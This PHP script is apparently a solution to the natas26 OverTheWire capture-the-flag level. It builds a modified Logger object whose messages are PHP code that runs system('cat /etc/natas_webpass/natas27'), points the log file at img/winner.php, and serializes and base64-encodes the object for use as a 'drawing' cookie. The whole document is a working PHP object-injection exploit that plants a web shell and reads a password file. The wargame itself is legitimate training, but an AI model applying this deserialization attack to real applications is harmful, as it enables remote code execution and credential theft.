<?php

# this is a Logger class found on natas26.overthewire challenge source code
# which we shall be using it to our favour :)

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct($file)
    {
        // initialise variables
        $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = $file;
  
        // write initial message
        $fd=fopen($this->logFile, "a+");
        fwrite($fd, $this->initMsg);
        fclose($fd);
    }
  
    function log($msg)
    {
        $fd=fopen($this->logFile, "a+");
        fwrite($fd, $msg."\n");
        fclose($fd);
    }
  
    function __destruct()
    {
        // write exit message
        $fd=fopen($this->logFile, "a+");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}

# here we create an object of the modified version of the Logger() class
$obj = new Logger("img/winner.php");
# serilize that object then encode it in base64 format
# copy the result and make it your drawing cookie in
# the request that's made to the server
echo (base64_encode(serialize($obj)));

